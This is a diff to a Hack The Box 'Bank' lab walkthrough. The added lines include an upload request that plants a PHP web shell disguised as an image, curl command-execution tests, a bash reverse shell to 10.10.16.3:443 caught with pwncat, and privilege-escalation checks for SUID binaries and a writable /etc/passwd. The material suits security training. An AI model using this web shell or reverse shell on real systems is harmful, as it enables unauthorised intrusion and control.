@@ -655,15 +655,118 @@ It's a series of actions against the target URL `http://bank.htb/balance-transfe
 It demonstrates a systematic approach to exploring and interacting with a web application, including enumeration of files, extraction of sensitive information, and identification of potential vulnerabilities for further exploitation.
 
 ```bash
+<!-- now clean the request by removing PNG components -->
+POST /support.php HTTP/1.1
+Host: bank.htb
+Content-Length: 511
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://bank.htb
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEOGUSjR7AU5XUxai
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://bank.htb/support.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: HTBBankAuth=qp491bad2gio3iv1k9p9frn863
+Connection: close
+
+------WebKitFormBoundaryEOGUSjR7AU5XUxai
+Content-Disposition: form-data; name="title"
+
+php
+------WebKitFormBoundaryEOGUSjR7AU5XUxai
+Content-Disposition: form-data; name="message"
+
+php
+------WebKitFormBoundaryEOGUSjR7AU5XUxai
+Content-Disposition: form-data; name="fileToUpload"; filename="y.png.htb"
+Content-Type: image/png
+
+<?php system($_REQUEST["cmd"]); ?>
+------WebKitFormBoundaryEOGUSjR7AU5XUxai
+Content-Disposition: form-data; name="submitadd"
+
+
+------WebKitFormBoundaryEOGUSjR7AU5XUxai--
+```
+
+```bash
 # or you can simply create the implant.png.htb with the following php code 
 <?php system($_REQUEST["cmd"]); ?>
+
+-------------------------------------------------------------------------------
 
 # verify with curl if php code execution works
 $ curl http://bank.htb/uploads/implant.png.htb?cmd=whoami
 www-data
 
+-------------------------------------------------------------------------------
+
 $ curl http://bank.htb/uploads/implant.png.htb --data-urlencode 'cmd=whoami'
 www-data
+```
+
+### pwncat
+
+```bash
+# rs with below curl command
+curl http://bank.htb/uploads/implant.png.htb --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"'
+
+-------------------------------------------------------------------------------
+
+# install pwncat
+sudo apt install pwncat -y
+
+-------------------------------------------------------------------------------
+
+# pwncat listening at 443 and you get the foothold as www-data user
+pwncat -l 443              
+bash: cannot set terminal process group (1071): Inappropriate ioctl for device
+bash: no job control in this shell
+
+-------------------------------------------------------------------------------
+
+# by using find commands looking for unusual SUID setup
+# /var/htb/bin/emergency is a sort of obvious one in the list
+www-data@bank:/var/www/bank/uploads$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/var/htb/bin/emergency
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/mtr
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/bin/ping
+/bin/ping6
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/umount
+
+-------------------------------------------------------------------------------
+
+# /etc/passwd is writable by everyone on the box
+www-data@bank:/var/www/bank/uploads$ ls -l /etc/passwd 
+ls -l /etc/passwd 
+-rw-rw-rw- 1 root root 1252 May 28  2017 /etc/passwd
+
+# check the sshd config for any attack surface
+grep PermitRootLogin /etc/ssh/sshd_config  
+#PermitRootLogin without-password
+PermitRootLogin yes
+# the setting of "PermitRootLogin without-password".
 ```
 
 ## Exploits
